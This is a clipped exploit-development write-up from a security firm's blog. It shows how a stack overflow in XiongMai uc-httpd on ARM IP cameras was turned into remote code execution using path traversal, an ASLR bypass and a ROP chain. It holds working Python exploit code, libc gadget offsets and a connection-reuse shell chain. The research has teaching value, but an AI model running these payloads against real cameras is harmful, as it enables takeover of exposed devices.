---
title: ROPing our way to RCE
source: https://modzero.com/en/blog/roping-our-way-to-rce/
source_host: modzero.com
clip_date: 2026-10-16T10:23:29+08:00
trace_id: aa44965c-5397-438b-886c-980f6ff7232f
content_hash: c2280d0d38b2538e491aa3edac627752decae594f24493b8fd4a397d4716239b
status: synced
tags:
  - 漏洞分析
  - ROP
series: null
feed_source: modzero·漏洞研究
ai_summary: TL;DR：XiongMai uc-httpd（Sofia）的 `sprintf` 栈溢出（后确认是 CVE-2022-45460）可在 ARM 设备上通过 ROP 链劫持执行流，并复用原 HTTP 连接直接拿到 shell。
ai_summary_style: key-points
images_status:
  total: 10
  succeeded: 10
  failed_urls: []
notion_page_id: 3fb75244-d011-8149-9fad-e49367e80197
ioc:
  cves:
    - CVE-2017-7577
    - CVE-2018-10088
    - CVE-2022-45460
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> TL;DR：XiongMai uc-httpd（Sofia）的 `sprintf` 栈溢出（后确认是 CVE-2022-45460）可在 ARM 设备上通过 ROP 链劫持执行流，并复用原 HTTP 连接直接拿到 shell。
> 
> - **目标与防护现状：** uc-httpd 全球约 7 万实例暴露在公网；`Sofia` 为 ARM 32 位动态链接、stripped 二进制，无 RELRO（GOT 可写）、无栈 canary、NX 关闭、无 PIE（固定加载地址）。
> - **漏洞定位：** 先借 CVE-2017-7577 路径遍历下载 `/proc/self/exe` 得到二进制；dispatcher 中当 URI 含 `mns.cab` 时用 `sprintf("/usr/mobile/%s")` 无边界拼接，溢出栈变量 `filepath`，304 字节填充即可覆盖 PC（R4–R10 先被弹出）。
> - **调试环境：** 放弃 QEMU 全模拟（地址行为异常），改用树莓派 chroot + 静态 `gdbserver` 运行目标，主机用 `gdb-multiarch` + GEF 远程连接调试。
> - **利用约束与绕过：** libc 带 PIE 且假设 ASLR 开启，故用路径遍历读 `/proc/self/maps` 算基址；`sprintf` 截断 null 且过滤空格，空格换成 `${IFS}`；用 Ropper 找 gadget：`pop {r3,pc}`、`system`、`mov r0,sp; blx r3`。
> - **连接复用（亮点）：** 溢出点前两次 `fwrite` 仍在 R3 中留下 `socket_stream`，因此依次调 `fileno` → `dup2(fd,0/1/2)` → `system("/bin/sh")`，无需反弹 shell 或 telnetd；函数符号 `+0x4` 跳过序言以规避 LR push，并按 epilogue 补栈。

In red teaming engagements, simply finding an XSS or basic misconfiguration often isn’t enough, achieving RCE is the real deal. During one such assessment, we came across XiongMai’s uc-httpd, a lightweight web server used in countless IP cameras worldwide. According to Shodan, roughly 70k instances of this software are publicly exposed on the internet. Despite its history of severe vulnerabilities, no readily available exploit seemed to provide code execution, so I set out to build one.

The original plan was to target CVE-2018-10088 [1](#fn:1), a buffer overflow vulnerability for which an existing exploit [2](#fn:2) only crashes the server but does not gain RCE. But as with most of these journeys, there’s rarely a straight path, and more often than not, adaptation is key. So along the way, I discovered new paths, learned about the ARM architecture, and built a ROP chain that was delivered via a web request and reused the same connection as a shell. Who needs a reverse shell anyway? But let’s start at the beginning of the story.

## Analysis

Before anything can be exploited we need an understanding of the vulnerability. So, first and foremost, I needed to obtain either the source code or a compiled binary of uc-http. Unsurprisingly, this software is not open source. But much to my convenience there is CVE-2017-7577 [3](#fn:3), a very trivial path traversal vulnerability, which allows to download arbitrary files from an affected uc-http server. Via `/proc/self/exe` the currently running executable - usually the file is called *Sofia* - can be downloaded for analysis.

I went ahead with the usual inspection of the target binary utilizing `file` and `checksec` [4](#fn:4). As we can see below it’s an ARM 32bit dynamically linked executable.

```bash
$ file Sofia
Sofia: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped
```

```bash
$ checksec --file=Sofia
RELRO           STACK CANARY      NX            PIE
No RELRO        No canary found   NX disabled   No PIE
```

There is no Relocation Read-Only (RELRO), meaning the Global Offset Table (GOT) is writable, no stack canary to detect stack overflows, and no-execute (NX) is disabled, allowing execution of shellcode on the stack. Also, since it isn’t a position-independent executable (PIE), the binary is always loaded at a fixed address.

I fired up Ghidra to decompile the binary and explore its inner workings. By cross-referencing the log output of the binary, when triggering the existing exploit, with strings found in the binary, I was able to pinpoint a function that appeared to act as an HTTP dispatcher (more on the exact debugging environment later).

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/a2021d61af0060bd.png)

Decompiled HTTP dispatcher of Sofia binary.

In this function CVE-2018-10088 was fairly simple to spot. The usual suspect `strcpy` was used to copy `username` and `password` parameters from an http request’s body into some data segments.

```c
substring = strtok((char *)0x0,"&");
strcpy(&DATA_USERNAME,substring + 9);
substring = strtok((char *)0x0,"&");
strcpy(&DATA_PASSWORD,substring + 9)
```

By inspecting said data segments I found that these buffers have a length of 20 bytes each. Therefore usernames and passwords that exceed a length of 20 characters cause the respective buffers to overflow. I also found that these buffers are located within the binary’s `.bss` data segment which is certainly not ideal for hijacking the program’s execution. I noticed though, that there are some function pointers further down in that segment that could be overwritten using this overflow which, in theory, could allow redirecting execution.

However, after skimming through the rest of the dispatcher function I found another vulnerability (CVE-2022-45460 as I found out much later) which seemed much more promising for what I had in mind. Let’s have a look at it.

```c
iVar1 = strcmp((char *)__s1,".lang");
if (iVar1 == 0) {
    sprintf(filepath,"%s/%s","/mnt/custom",&DAT_FILEPATH);
}
else {
    substring = strstr((char *)uri,"mns.cab");
    if (substring == (char *)0x0) {
        strstr((char *)uri,"logo/");
    sprintf(filepath,"%s/%s");
    }
    else {
        sprintf(filepath,"%s/%s","/usr/mobile",uri);
    }
}
iVar1 = stat(filepath,&stat_struct);
if (iVar1 != 0) {
    if ((filepath[0] != '\0') && (iVar1 = atoi(filepath), 0 < iVar1)) {
        DAT_006e9324 = iVar1;
        sprintf((char *)&uStack_68,".%s","/index.htm");
        FUN_003376cc(socket_stream,&uStack_68,0);
        return 0;
    }
    write_response_header(socket_stream,0x68);
    fwrite("<html><head><title>404 File Not Found</title></head>\n",1,0x35,socket_stream);
    fwrite("<body>The requested URL was not found on this server</body></html>\n",1,0x43,socket_stream);
    return 0;
}
```

The excerpt shows that URIs and file paths are concatenated using `sprintf`, once again without any bounds checking. Particularly interesting is the branch where the user-controlled URI is concatenated with the string */usr/mobile*. In this case the overflow happens on a stack variable I called `filepath`. Overflows on the stack are powerful because typically function return addresses are stored on the stack, making it possible to overwrite them during an overflow and redirect the program’s execution. And since there are no stack canaries in place to hinder exploitation, this should be relatively straightforward to exploit.

## Debugging Setup

Before diving into experiments with the vulnerability, I wanted to set up a dedicated testing environment for debugging. My goal with this was to avoid relying on any hardware device. Without the use of any existing exploit I also didn’t have access to the device to deploy a debugger.

So I began with dumping the filesystem using the path traversal vulnerability as mentioned before. I then experimented with `chroot` and QEMU’s ARM System emulator [5](#fn:5) to have a purely virtualized environment. This worked quite well for a while but eventually exhibited seemingly weird behavior particularly in terms of memory addressing.

I still had a Raspberry Pi lying around, so I figured I’d give that one a try. I copied the gathered rootfs to the Pi and grabbed static `gdbserver` [6](#fn:6) and `bash` (required by gdb) binaries. I then started up `gdbserver` inside the chroot on the Pi.

```bash
$ sudo mount --bind /proc/ rootfs/proc
mount: (hint) your fstab has been modified, but systemd still uses
       the old version; use 'systemctl daemon-reload' to reload.
pwn@raspberrypi:~ $ sudo chroot rootfs/ sh
# ls
bin        dev        gdbserver  linuxrc    proc       tmp        utils
boot       etc        lib        mnt        sbin       usr        var
# ./gdbserver :8888 Sofia
Process Sofia created; pid = 911
Listening on port 8888
Remote debugging from host 192.168.2.1, port 64996
```

Then I connected to it from my machine using `gdb-multiarch`.

```bash
$ gdb-multiarch
GNU gdb (Debian 15.2-1+b1) 15.2
Copyright (C) 2024 Free Software Foundation, Inc.
(...)
gef➤ gef-remote 192.168.2.2 8888
```

So the final setup looked roughly like this [7](#fn:7) [8](#fn:8):

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/e1da8da5e5858998.png)

Raspberry Pi debugging setup with GDB-Server and GEF-client.

This setup allowed to use GEF [9](#fn:9) on the attacker’s machine to set breakpoints and debug the target on the Pi remotely. Perfect.

## Triggering the Vulnerability

With the described setup in place a first attempt could be made to trigger the identified vulnerability. This process was no different than with any pwn binary exploitation challenge of this type. To take control of execution, we first need to determine where our input overwrites a specific offset on the stack that eventually gets popped into the program counter (PC). By sending a unique pattern and observing which bytes end up in the PC when the program crashes, we can pinpoint the exact offset. The only thing to keep in mind was to always end the URI with *.mns.cab* to ensure the correct code path was being hit.

```python
import sys
import socket

payload = b""
payload += 304 * b"A" + b"BBBB"

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((sys.argv[1], int(sys.argv[2])))
    sock.send(b"GET /" + payload + b".mns.cab HTTP/1.1")
    sock.send(b"\r\n\r\n")

    print(sock.recv(1024))
```

To observe what was happening server-side, I placed a breakpoint at the return statement following the vulnerable section, right after the second call to `fwrite`. As shown below, registers r4 to r10 are popped from the stack, followed by PC. With the Python script above, these registers were filled with the character A, while PC was set to *BBBB*, marking the entry point for the control flow hijacking.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/53d82020d0ce2c0b.png)

Triggering the buffer overflow vulnerability.

## Building the Exploit

At this point there are a few things to mention. Although NX was disabled, meaning there should have been an executable stack, I wasn’t really sure about this. Within my Raspberry Pi setup the stack was always marked as `rw` as opposed to `rwx`. Attempts of executing shellcode from the stack failed. I therefore (incorrectly) assumed that this would be the same on a real device. I didn’t spend much more thought about it and continued with the plan to build a ROP chain instead.

A ROP (Return-Oriented Programming) chain is a technique used in exploitation where an attacker leverages small code snippets, or *gadgets*, already present in a program’s memory. By chaining these gadgets together, they can execute arbitrary code without injecting anything new.

Also, although PIE was disabled for the *Sofia* binary itself, the included libraries had PIE enabled and I was therefore also assuming that ASLR was enabled. When building a ROP chain this means that an ASLR bypass is needed in order to use gadgets from included libraries such as libc.

Another important thing to keep in mind is that, since we’re using `sprintf` for the overflow, the payload cannot contain null bytes, or it will be truncated. Additionally, after inspecting the decompiled section further, I found that spaces are stripped as well.

### ASLR Bypass

Because PIE is not enabled on the *Sofia* binary, it will always be loaded into the same memory region, even if ASLR is enabled. However, since the binary is mapped within a region that only spans the lower 3 bytes of the address space, every address contains a null byte in its most significant byte. This means that, at least for the entry point of the ROP chain, gadgets from the *Sofia* binary itself can’t be used. I therefore focused on the included libc, but since libc was compiled with PIE, bypassing ASLR became essential.

As you might have guessed, our path traversal vulnerability came to the rescue once again, this time to bypass ASLR. There is really no magic to it other than dumping `/proc/self/maps` to retrieve the memory mapping of the *Sofia* process thus allowing to determine base addresses of all included libraries.

### ARM Architecture

Since building a ROP chain requires an understanding of the underlying architecture, we first have to cover some very basic concepts about the ARM architecture. If you’re already familiar with this, feel free to skip this part.

ARM is a RISC architecture, meaning it uses a smaller set of simple instructions compared to complex ones like x86. It’s widely used in mobile devices and embedded systems.

A unique aspect of ARM is the Thumb instruction set. Thumb is a subset of the most commonly used 32-bit ARM instructions, with each instruction being just 16 bits long. These instructions have the same effect as their 32-bit counterparts but allow for more compact, efficient code. ARM processors can switch between ARM and Thumb modes during execution [10](#fn:10).

For ROP chains, ARM’s calling convention [11](#fn:11) is particularly important, as it dictates how function arguments are passed and how control flow is managed. ARM has 16 general-purpose registers, from R0 to R15. Registers R0-R3 are used for passing the first four function arguments, and if a function has more than four arguments, the rest are placed on the stack. R4-R11 are used for storing local variables within a function. Return values from functions are stored in R0-R3.

When it comes to jumps in ARM, there are four main types: B, BL, BX, and BLX. These instructions control program flow and differ in their ability to save the return address or switch between ARM and Thumb modes. The table below summarizes their properties [12](#fn:12):

| Instruction | Functionality | Saves Return Address (LR) | Can Switch Instruction Set? |
| --- | --- | --- | --- |
| B   | Simple branch | No  | No  |
| BL  | Branch with Link | Yes | No  |
| BX  | Branch and exchange instruction set | No  | Yes (depending on destination) |
| BLX | Branch with Link and exchange instruction set | Yes | Yes (depending on destination) |

When the return address is saved, it means that the address of the next instruction after the branch is stored in the Link Register (LR). This allows the program to return to this point after the branch or function call is complete. As we will see later, this is reflected in function prologues and epilogues. In a function’s prologue, the LR register is typically pushed to the stack to preserve the return address, and in the epilogue, it is popped back into PC to ensure the program jumps back to the calling function.

### Hunting for Gadgets

Let’s talk about building the ROP chain. At the end of the day, this process is all about finding useful gadgets that work together to achieve a specific goal. For my first attempt, I set out to build a chain that executes `system("/bin/sh")`.

For this to work I needed gadgets that would move the stack pointer into R0 (since R0 is where the first argument is passed) and then jump to the `system` function contained in the loaded libc. This way, I could use the stack to place the command I wanted to execute.

To find these gadgets, the widely used tool Ropper [13](#fn:13) is very handy. It’s designed for identifying and extracting ROP gadgets from binaries.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/474e08ca650f394b.png)

Hunting for gadgets using Ropper.

After searching for a while I came up with the following solution:

```bash
0x000175cc: pop {r3, pc}
0x000535e8: system
0x000368dc: mov r0, sp; blx r3
```

The first gadget sets R3 to a controlled value and jumps to the next address. The second gadget (`mov r0, sp; blx r3`) moves the stack pointer into R0 (the first argument for system) and branches to R3, which we previously set to the address of system.

Function addresses, such as the one for `system`, can be determined using `readelf -s`. However, it’s important to remember that we’ll need to add the base address of the respective binary or library to the offsets you see in the output. This ensures we’re working with the correct addresses when constructing the ROP chain.

```bash
$ readelf -s libc.so.0 | grep system
   659: 0003dfc0    80 FUNC    GLOBAL DEFAULT    7 svcerr_systemerr
   853: 000535e8   116 FUNC    WEAK   DEFAULT    7 system
   864: 000535e8   116 FUNC    GLOBAL DEFAULT    7 __libc_system
```

As we learned earlier, the payload cannot contain any spaces. However, I found that this can easily be bypassed using the well-known `${IFS}` tactic [14](#fn:14).

Putting everything together I came up with an exploit roughly looking like the following (full source available [here](https://github.com/born0monday/CVE-2022-45460/blob/main/exploit-simple.py)):

```python
def main():
    maps = fetch_maps()
    libc, libc_base = parse_maps(maps)

    payload = b""
    payload += 304 * b"A"
    payload += pack("<I", libc_base + GADGETS[libc][0]) # pop {r3, pc}
    payload += pack("<I", libc_base + GADGETS[libc][1]) # system
    payload += pack("<I", libc_base + GADGETS[libc][2]) # mov r0, sp; blx r3

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((HOST, PORT))
        sock.send(b"GET /" + payload + CMD.replace(b" ", b"${IFS}") + b";.mns.cab HTTP/1.1")
        sock.send(b"\r\n\r\n")
    
        print(sock.recv(1024))
```

Since `/bin/sh` as a command wasn’t very useful without a way to interact with it remotely, I used `telnetd` to start a local telnet server on port 1337. This allowed me to connect and get a shell.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3f051603d827470c.png)

Simple exploit with shell via telnetd.

Yay, RCE! But ever since analyzing the decompiled dispatcher function, another possible solution had been stuck in my mind. I kept wondering if it was actually possible. Time to find out - off to Part 2.

### Part 2 - Taking it a Step Further

Let’s rewind a bit and recall the code section where control flow is transferred to our choosing because of the buffer overflow. We can see that shortly before the return statement there are two `fwrite` calls writing the response to the `socket_stream` of the connection to the client which sent the original request.

This led me to the following two assumptions:

-   The connection isn’t closed yet when the ROP chain is triggered
-   A reference to `socket_stream` is very likely still lying around in one of the registers

```c
write_response_header(socket_stream,0x68);
    fwrite("<html><head><title>404 File Not Found</title></head>\n",1,0x35,socket_stream);
    fwrite("<body>The requested URL was not found on this server</body></html>\n",1,0x43,socket_stream);
    return 0;
}
```

This reminded me of CTF challenges where the vulnerable binary is exposed over a socket, often using `socat`. In these cases, a common approach when crafting shellcode to achieve RCE is the following [15](#fn:15):

```c
fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // create socket
connect(fd, (struct sockaddr *) &serv_addr, 16); // connect
dup2(fd, 0); // dup socket and STDIN
dup2(fd, 1); // dup socket and STDOUT
dup2(fd, 2); // dup socket and STDERR
execve("/bin/sh", 0, 0); // execute /bin/sh
```

The `socket()` function creates a new socket using the specified domain, type, and protocol. `connect()` then establishes a connection to the target address. Once connected, `dup2()` is used three times to redirect the socket file descriptor to standard input (STDIN), standard output (STDOUT), and standard error (STDERR), effectively binding the shell’s I/O to the socket. Finally, `execve()` executes `/bin/sh`, spawning a shell that communicates over the established connection.

In the situation as described above, I was already half way done with this strategy. I already had a socket/connection so anything left to do were the `dup2` calls and the call to `system`, right? This would allow me to reuse the connection already established as a shell.

Since I had a `FILE *stream` but needed an integer file descriptor for `dup2`, an extra step was required though - a call to `fileno()` to retrieve the corresponding file descriptor. So this made the plan look roughly like the following.

```c
fd = fileno(stream)
dup2(fd, 0)
dup2(fd, 1)
dup2(fd, 2)
system("/bin/sh")
```

However, before jumping into building the ROP chain, I wanted to verify the assumptions I had made earlier. To do this, I set a breakpoint before the second `fwrite` call and another at the return statement. When hitting the first breakpoint, a reference to `socket_stream` should be in R3 (the 4th argument of `fwrite`).

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/728868b59e172ac1.png)

Printing R3 register in GDB before fwrite call.

At the second breakpoint, we can see that the same value is still in R3, which confirms that we indeed have a reference to `socket_stream` available when the ROP chain is triggered.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/b289454e18997562.png)

Printing R3 register in GDB before ROP chain is triggered.

During this process, I also noticed that the `curl` command I had issued to trigger the breakpoints hadn’t returned while the program was stopped. This meant that the connection was still open. Great news, the assumptions seemed to hold.

Next step, ROP chain. I continued with searching for gadgets that would move arguments into the correct registers and call the functions as outlined before. I assumed that every function called would return using `pop {pc}` and therefore I wouldn’t need to worry about the chaining of gadgets and function calls. I was wrong, at least partly.

While the `pop {pc}` assumption was true I still couldn’t simply chain the calls. Why? Because I forgot about function prologues. As we can see below in the function prologue of `fileno` for example the registers R4-R8 are pushed to the stack. This makes sure the registers can be restored upon function return (callee-save registers). But we can also see that the Link Register (LR) is pushed to the stack as well.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/eb8222d250a436da.png)

Inspecting fileno's disassembled function prologue.

With the knowledge of the different jump instructions discussed earlier, this also makes perfect sense. Functions are called using the `bl` instruction, which sets LR to the address of the instruction immediately following the jump. This ensures that upon exit of a function we’re returning back to the correct location.

However, for my pursuit of building a ROP chain, this sounded like bad news because I didn’t really have control over the LR register. I continued searching for gadgets that would allow me to set LR before jumping to a function. Even though the solution might seem obvious to you, it took me a good night’s sleep to finally realize that we could simply skip the prologue. This way I wouldn’t have to worry about the value in LR at all. So I simply added `+0x4` to every function symbol. Problem solved.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/44250e27f3c5dacf.png)

Inspecting fileno's disassembled function epilogue.

The only requirement was to add some padding onto the stack to account for the function epilogue. In the case of `fileno`, this meant 5 x 8 bytes in total. This turned out to be quite useful, as it allowed me to set these registers to arbitrary values.

I continued to piece things together. As outlined I started with a call to `fileno`.

```python
p = b""
p += p32(libc_base + 0xf964) # mov r0, r3; pop {r4, pc}
p += b"XXXX" # r4 padding
p += p32(libc_base + 0x3102c + 0x4) # fileno
```

The first gadget moves the socket reference `socket_stream` into R0 to ensure it is passed as an argument to `fileno`. After the call some padding is added to properly deal with the function epilogue. The `ldmia` construct can be regarded as equivalent to the `pop` we have seen earlier. Register R5 will be used later, so I’m storing the address of `dup2` there in advance.

```python
# fileno epilogue: ldmia sp!,{r4,r5,r6,r7,r8,pc}
p += b"XXXX" # r4 padding
p += p32(libc_base + 0xce5c + 0x4) # r5 -> dup2
p += b"XXXX" # r6 padding
p += b"XXXX" # r7 padding
p += b"XXXX" # r8 padding
```

Next up are the calls to `dup2`. For this to work the function needs to be called three times for STDIN, STDOUT and STDERR. For all three calls, R0 should always be set to the file descriptor retrieved through `fileno`, while R1 starts with 0, then 1, and finally 2. The first call comes for free because R1 is set to 0 already.

```python
p += p32(libc_base + 0xce5c + 0x4) # dup2, r1 = 0
# dup2 epilogue: ldmia sp!,{r7,pc}
p += b"XXXX" # r7 padding
```

For the second call, I found a gadget that moves 1 into R1 before jumping to the address stored in R5, where I already have `dup2`.

```python
p += p32(libc_base + 0x1cdcc) # mov r1, #1; mov r2, r6; blx r5
# dup2 epilogue: ldmia sp!,{r7,pc}
p += b"XXXX" # r7
```

Unfortunately, I couldn’t find a feasible gadget for the third call. So, this is left as an exercise for the reader.:)

Now, all that was left to do was reuse the chain from the first simple exploit to spawn a shell.

```python
p += p32(libc_base + 0x175cc) # pop {r3, pc};
p += p32(libc_base + 0x535e8) # system
p += p32(libc_base + 0x368dc) # mov r0, sp; blx r3
```

With that, it was finally time to test things out.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/5d7ade993bf388b2.png)

Final exploit with shell via connection reuse.

Success! A far more elegant solution than the first attempt. No need to start a telnetd server or establish a reverse shell!

The final exploit source code can be found [here](https://github.com/born0monday/CVE-2022-45460).

## Wrapping up

As already hinted along the way, I only discovered after developing the exploit that the vulnerability discussed here had already been identified and tracked as CVE-2022-45460 [16](#fn:16). There had also already been an exploit [17](#fn:17) out there that uses shellcode on the stack to achieve RCE. Clearly, my initial research on the product wasn’t as thorough as it should have been. Nonetheless, I had lots of fun exploring alternative ways of exploiting the vulnerability and learned a great deal in the process. Given the existence of a public exploit, we felt comfortable releasing my full exploit, even though we would typically refrain from doing so in other circumstances.

1.  CVE-2018-10088 - [https://nvd.nist.gov/vuln/detail/CVE-2018-10088](https://nvd.nist.gov/vuln/detail/CVE-2018-10088) [↩](#fnref:1 "return to article")
    
2.  Exploit for CVE-2018-10088 - [https://www.exploit-db.com/exploits/44864](https://www.exploit-db.com/exploits/44864) [↩](#fnref:2 "return to article")
    
3.  CVE-2017-7577 - [https://nvd.nist.gov/vuln/detail/CVE-2017-7577](https://nvd.nist.gov/vuln/detail/CVE-2017-7577) [↩](#fnref:3 "return to article")
    
4.  Checksec - [https://github.com/slimm609/checksec](https://github.com/slimm609/checksec) [↩](#fnref:4 "return to article")
    
5.  Arm System emulator - [https://www.qemu.org/docs/master/system/target-arm.html](https://www.qemu.org/docs/master/system/target-arm.html) [↩](#fnref:5 "return to article")
    
6.  GDB Static - [https://github.com/guyush1/gdb-static](https://github.com/guyush1/gdb-static) [↩](#fnref:6 "return to article")
    
7.  Laptop Vectors by Vecteezy - [https://www.vecteezy.com/free-vector/laptop](https://www.vecteezy.com/free-vector/laptop) [↩](#fnref:7 "return to article")
    
8.  Raspberry Pi Vector Png - [https://www.raspberrylovers.com/1995/06/raspberry-pi-vector-png.html](https://www.raspberrylovers.com/1995/06/raspberry-pi-vector-png.html) [↩](#fnref:8 "return to article")
    
9.  GEF (GDB Enhanced Features) - [https://github.com/hugsy/gef](https://github.com/hugsy/gef) [↩](#fnref:9 "return to article")
    
10.  The Thumb instruction set - [https://developer.arm.com/documentation/ddi0210/c/CACBCAAE](https://developer.arm.com/documentation/ddi0210/c/CACBCAAE) [↩](#fnref:10 "return to article")
     
11.  ARM calling convetion - [https://kolegite.com/EE_library/books_and_lectures/%D0%9F%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%B8%D1%80%D0%B0%D0%BD%D0%B5/Assembly/ARM_calling_convention.pdf](https://kolegite.com/EE_library/books_and_lectures/%D0%9F%D1%80%D0%BE%D0%B3%D1%80%D0%B0%D0%BC%D0%B8%D1%80%D0%B0%D0%BD%D0%B5/Assembly/ARM_calling_convention.pdf) [↩](#fnref:11 "return to article")
     
12.  ARM instructions - [https://developer.arm.com/documentation/dui0379/e/arm-and-thumb-instructions/](https://developer.arm.com/documentation/dui0379/e/arm-and-thumb-instructions/) [↩](#fnref:12 "return to article")
     
13.  Ropper - [https://github.com/sashs/Ropper](https://github.com/sashs/Ropper) [↩](#fnref:13 "return to article")
     
14.  Bypass Without Space - [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#bypass-without-space](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md#bypass-without-space) [↩](#fnref:14 "return to article")
     
15.  ARM Assembly Shellcode - [https://conference.hitb.org/hitbsecconf2018ams/materials/D1T3%20-%20Maria%20Markstedter%20-%20From%20Zero%20to%20ARM%20Assembly%20Bind%20Shellcode.pdf](https://conference.hitb.org/hitbsecconf2018ams/materials/D1T3%20-%20Maria%20Markstedter%20-%20From%20Zero%20to%20ARM%20Assembly%20Bind%20Shellcode.pdf) [↩](#fnref:15 "return to article")
     
16.  CVE-2022-45460 - [https://nvd.nist.gov/vuln/detail/CVE-2022-45460](https://nvd.nist.gov/vuln/detail/CVE-2022-45460) [↩](#fnref:16 "return to article")
     
17.  Exploit for CVE-2022-45460 - [https://github.com/tothi/pwn-hisilicon-dvr/tree/master](https://github.com/tothi/pwn-hisilicon-dvr/tree/master) [↩](#fnref:17 "return to article")
